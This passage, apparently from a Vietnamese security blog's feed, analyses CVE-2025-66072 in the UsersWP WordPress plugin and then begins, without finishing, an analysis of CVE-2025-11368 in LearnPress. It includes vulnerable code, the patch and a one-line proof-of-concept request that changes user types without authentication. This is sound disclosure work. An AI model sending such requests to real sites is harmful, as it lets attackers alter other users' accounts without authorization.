vẫn có thể khiến &lt;code&gt;admin_init&lt;/code&gt; được kích hoạt dù họ không truy cập vào trang admin.&lt;/p&gt;&#xA;&lt;p&gt;Điều này có nghĩa là bất kể user nào, chỉ cần gửi request đến &lt;code&gt;admin-ajax.php&lt;/code&gt; hoặc &lt;code&gt;admin-post.php&lt;/code&gt;, hook &lt;code&gt;admin_init&lt;/code&gt; vẫn được chạy, và khi đó callback &lt;code&gt;handle_bulk_user_type_change&lt;/code&gt; sẽ được gọi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_bulk_user_type_change() {&#xA;    if ( ! isset( $_GET[&amp;#39;uwp_change_user_type&amp;#39;], $_GET[&amp;#39;uwp_new_user_type&amp;#39;] ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    $new_user_type = absint( $_GET[&amp;#39;uwp_new_user_type&amp;#39;] );&#xA;&#xA;    if ( ! $new_user_type ) {&#xA;        return;&#xA;    }&#xA;&#xA;    $users = isset( $_REQUEST[&amp;#39;users&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $_REQUEST[&amp;#39;users&amp;#39;] ) ? (array) $_REQUEST[&amp;#39;users&amp;#39;] : array();&#xA;&#xA;    if ( ! empty( $users ) ) {&#xA;        array_map( function( $user_id ) use ( $new_user_type ) {&#xA;            update_user_meta( absint( $user_id ), &amp;#39;_uwp_register_form_id&amp;#39;, (int) $new_user_type );&#xA;        }, $users );&#xA;    } &#xA;&#xA;    wp_safe_redirect( add_query_arg( &amp;#39;user_type_updated&amp;#39;, &amp;#39;true&amp;#39;, admin_url( &amp;#39;users.php&amp;#39; ) ) );&#xA;    exit;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm kiểm tra xem request có chứa &lt;code&gt;uwp_change_user_type&lt;/code&gt; và &lt;code&gt;uwp_new_user_type&lt;/code&gt; hay không; nếu không có thì dừng lại.&lt;/p&gt;&#xA;&lt;p&gt;Nếu có, hàm lấy giá trị &lt;code&gt;uwp_new_user_type&lt;/code&gt; từ &lt;code&gt;$_GET&lt;/code&gt; và chuyển thành số nguyên dương. Nếu giá trị này không hợp lệ, hàm dừng lại.&lt;/p&gt;&#xA;&lt;p&gt;Tiếp theo, hàm lấy danh sách user từ &lt;code&gt;$_REQUEST[&#39;users&#39;]&lt;/code&gt;. Nếu mảng này không rỗng, hàm thực hiện &lt;code&gt;update_user_meta()&lt;/code&gt; cho từng user, cập nhật &lt;code&gt;_uwp_register_form_id&lt;/code&gt; bằng giá trị &lt;code&gt;$new_user_type&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Cuối cùng, hàm redirect về &lt;code&gt;users.php&lt;/code&gt; với tham số &lt;code&gt;user_type_updated=true&lt;/code&gt; và kết thúc xử lý.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-12-cve-2025-66072/type.png&#34; title=&#34;Danh sách User Type&#34; data-thumbnail=&#34;/posts/2025-12-12-cve-2025-66072/type.png&#34; data-sub-html=&#34;&lt;h2&gt;User Type&lt;/h2&gt;&lt;p&gt;Danh sách User Type&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-12-cve-2025-66072/type.png&#39; alt=&#34;User Type&#34; height=&#34;338&#34; width=&#34;747&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Danh sách User Type&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Lỗ hổng phát sinh do không thực hiện bất kỳ kiểm tra quyền (capability/permission) nào.&lt;/strong&gt; Điều này cho phép mọi người dùng – kể cả không có quyền quản trị – gọi vào endpoint và thực hiện thay đổi User Type cho user bất kỳ, dù hành động đó lẽ ra chỉ dành cho admin.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá (v1.2.48):&lt;/strong&gt; bổ sung vào hàm &lt;code&gt;handle_bulk_user_type_change&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kiểm tra nonce: Hàm yêu cầu &lt;code&gt;_wpnonce&lt;/code&gt; phải tồn tại và hợp lệ với action &lt;code&gt;&#39;bulk-users&#39;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $_GET[&amp;#39;_wpnonce&amp;#39;] ) || ! wp_verify_nonce( $_GET[&amp;#39;_wpnonce&amp;#39;], &amp;#39;bulk-users&amp;#39; ) ) {&#xA;    wp_die( __( &amp;#39;Security check failed. Please try again.&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kiểm tra quyền: Chỉ những user có capability &lt;code&gt;edit_users&lt;/code&gt; mới được phép thực hiện thao tác.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;edit_users&amp;#39; ) ) {&#xA;    wp_die( __( &amp;#39;You do not have permission to perform this action.&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-12-cve-2025-66072/diff.png&#34; title=&#34;Diff code&#34; data-thumbnail=&#34;/posts/2025-12-12-cve-2025-66072/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Diff code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-12-cve-2025-66072/diff.png&#39; alt=&#34;Diff&#34; height=&#34;568&#34; width=&#34;1865&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Any user (including Unauthenticated)&amp;#34;] --&amp;gt; B[&amp;#34;Send request to admin-ajax.php or admin-post.php with uwp_change_user_type &amp;#43; uwp_new_user_type&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Hook admin_init is triggered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Callback handle_bulk_user_type_change() executes&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;Are required GET parameters present?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;Function exits&amp;#34;]&#xA;E -- Yes --&amp;gt; G[&amp;#34;Retrieve uwp_new_user_type from $_GET&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;Is uwp_new_user_type a valid integer?&amp;#34;}&#xA;H -- No --&amp;gt; F&#xA;H -- Yes --&amp;gt; I[&amp;#34;Retrieve users list from $_REQUEST[&amp;#39;users&amp;#39;]&amp;#34;]&#xA;I --&amp;gt; J{&amp;#34;Is users list not empty?&amp;#34;}&#xA;J -- No --&amp;gt; F&#xA;J -- Yes --&amp;gt; K[&amp;#34;update_user_meta() for each user in the list&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Redirect to users.php?user_type_updated=true&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;User Type changed without any capability check&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gửi request với Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-post.php?uwp_change_user_type=2&amp;amp;uwp_new_user_type=user_type_id&amp;amp;users[]=uid_1&amp;amp;users[]=uid_2 HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-66072 phát sinh từ việc &lt;strong&gt;thiếu kiểm tra ủy quyền&lt;/strong&gt; trong hàm &lt;code&gt;handle_bulk_user_type_change()&lt;/code&gt; của UsersWP &amp;lt;= 1.2.47. Điều này cho phép &lt;strong&gt;mọi người dùng, kể cả người dùng chưa đăng nhập&lt;/strong&gt;, thay đổi User Type của các user khác bằng cách gửi request được tạo đặc biệt tới &lt;code&gt;admin-ajax.php&lt;/code&gt; hoặc &lt;code&gt;admin-post.php&lt;/code&gt;. Bản vá trong phiên bản 1.2.48 đã khắc phục lỗ hổng bằng cách bổ sung &lt;strong&gt;kiểm tra nonce&lt;/strong&gt; và &lt;strong&gt;kiểm tra capability&lt;/strong&gt;, giới hạn hành động chỉ cho những user được phép.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Luôn thực hiện &lt;strong&gt;kiểm tra capability&lt;/strong&gt; (&lt;code&gt;current_user_can&lt;/code&gt;) khi thao tác với các chức năng nhạy cảm trong WordPress.&lt;/li&gt;&#xA;&lt;li&gt;Sử dụng &lt;strong&gt;nonce&lt;/strong&gt; để ngăn chặn các request giả mạo hoặc không được phép.&lt;/li&gt;&#xA;&lt;li&gt;Không chỉ dựa vào hook như &lt;code&gt;admin_init&lt;/code&gt;; đảm bảo mọi endpoint công khai đều &lt;strong&gt;xác thực quyền&lt;/strong&gt; và &lt;strong&gt;tính hợp pháp của request&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Người dùng với quyền thấp hoặc chưa đăng nhập có thể khai thác endpoint nếu kiểm soát truy cập không đầy đủ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/userswp/vulnerability/wordpress-userswp-plugin-1-2-47-broken-access-control-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UsersWP Plugin &amp;lt;= 1.2.47 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11368 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-11-cve-2025-11368/</link>
      <pubDate>Thu, 11 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-11-cve-2025-11368/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;LearnPress – WordPress LMS Plugin&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; tồn tại lỗ hổng &lt;strong&gt;Sensitive Information Disclosure&lt;/strong&gt; trong tất cả các phiên bản cho đến, và bao gồm, &lt;strong&gt;4.2.9.4&lt;/strong&gt;. Nguyên nhân là do thiếu &lt;strong&gt;capability checks&lt;/strong&gt; trong &lt;strong&gt;REST endpoint&lt;/strong&gt; &lt;strong&gt;/wp-json/lp/v1/load_content_via_ajax&lt;/strong&gt; cho phép thực thi &lt;strong&gt;arbitrary callback&lt;/strong&gt; của các &lt;strong&gt;admin-only template methods&lt;/strong&gt;. Điều này khiến &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; có thể lấy được &lt;strong&gt;admin curriculum HTML&lt;/strong&gt;, &lt;strong&gt;quiz questions with correct answers&lt;/strong&gt;, &lt;strong&gt;course materials&lt;/strong&gt;, và các &lt;strong&gt;sensitive educational content&lt;/strong&gt; khác thông qua &lt;strong&gt;REST API endpoint&lt;/strong&gt; nếu họ cung cấp được &lt;strong&gt;valid numeric IDs&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11368&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11368&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/learnpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LearnPress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LP_REST_AJAX_Controller extends LP_Abstract_REST_Controller {&#xA;&#x9;public function __construct() {&#xA;&#x9;&#x9;$this-&amp;gt;namespace = &amp;#39;lp/v1&amp;#39;;&#xA;&#x9;&#x9;$this-&amp;gt;rest_base = &amp;#39;load_content_via_ajax&amp;#39;;&#xA;&#xA;&#x9;&#x9;parent::__construct();&#xA;&#x9;}&#xA;&#xA;&#x9;public function register_routes() {&#xA;&#x9;&#x9;$this-&amp;gt;routes = array(&#xA;&#x9;&#x9;&#x9;&amp;#39;/&amp;#39; =&amp;gt; array(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::ALLMETHODS,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;get_content&amp;#39; ),&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;permission_callback&amp;#39; =&amp;gt; &amp;#39;__return_true&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;);&#xA;&#xA;&#x9;&#x9;parent::register_routes();&#xA;&#x9;}&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đoạn mã trên, &lt;strong&gt;class LP_REST_AJAX_Controller&lt;/strong&gt; kế thừa từ &lt;strong&gt;LP_Abstract_REST_Controller&lt;/strong&gt; và được sử dụng để đăng ký một &lt;strong&gt;REST API endpoint&lt;/strong&gt; cho plugin &lt;strong&gt;LearnPress&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;__construct()&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Thiết lập &lt;strong&gt;namespace&lt;/strong&gt; là &lt;code&gt;lp/v1&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Thiết lập &lt;strong&gt;rest_base&lt;/strong&gt; là &lt;code&gt;load_content_via_ajax&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Gọi lại &lt;strong&gt;parent::__construct()&lt;/strong&gt; để kế thừa các thiết lập từ lớp cha.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;register_routes()&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Khai báo một route &lt;code&gt;/&lt;/code&gt; với các đặc điểm:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;methods&lt;/strong&gt;: chấp nhận tất cả các phương thức HTTP (&lt;strong&gt;WP_REST_Server::ALLMETHODS&lt;/strong&gt;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;callback&lt;/strong&gt;: gọi hàm 